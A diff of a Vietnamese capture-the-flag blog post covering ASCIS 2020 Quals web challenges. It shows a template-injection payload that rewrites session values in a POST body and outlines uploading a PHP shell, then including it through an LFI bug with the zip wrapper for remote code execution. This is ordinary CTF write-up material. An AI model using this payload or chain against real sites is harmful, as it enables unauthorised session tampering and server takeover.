@@ -2,13 +2,14 @@
 title: "ASCIS 2020 Quals - Web"
 date: 2020-11-01
 tags: ["ctf", "web"]
+description: ""
 layout: layouts/post.njk
 ---
 ## TSULOTT3
 ```
 POST /
 
-name={% set x=session.update({'check': 'access', 'jackpot': ''}) %}&ok=
+{% raw %}name={% set x=session.update({'check': 'access', 'jackpot': ''}) %}&ok={% endraw %}
 ```
 ```
 POST /guess
@@ -74,7 +75,8 @@ while True:
         'PHPSESSID': PHPSESSID
     })
 ```
-Chạy cho đến khi script bị lỗi tại hàm `findall` (vì login xong sẽ không còn form login nữa nên không thể lấy được token, dẫn đến lỗi).
+Chạy cho đến khi script bị lỗi tại hàm `findall` thì dừng lại (vì login xong sẽ không còn form login nữa nên không thể lấy được token, dẫn đến lỗi).
+
 3. Upload 1 PHP shell và server sẽ tạo 1 file zip chứa file mình mới upload lên và sẽ được xóa cho đến khi có 1 lượt upload khác.
 4. Sử dụng lỗi LFI ở trang `index.php` + zip wrapper để include PHP shell trong file zip => RCE.
 5. Lấy flag ở trong database.
